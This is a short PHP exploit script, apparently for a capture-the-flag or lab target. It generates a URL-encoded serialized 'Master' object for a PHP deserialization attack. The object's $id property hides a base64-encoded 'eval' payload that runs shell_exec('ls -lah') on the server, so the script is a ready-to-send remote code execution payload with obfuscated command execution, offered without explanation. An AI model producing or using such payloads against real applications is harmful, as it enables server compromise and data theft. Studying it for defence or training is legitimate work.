<?php

class Master{

	private $id = "eval(base64_decode(\"aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW47Iik7ZXhpdChzaGVsbF9leGVjKCJscyAt
bGFoIikpOwo=\"));";
	private $host;
}

print urlencode(serialize(new Master));




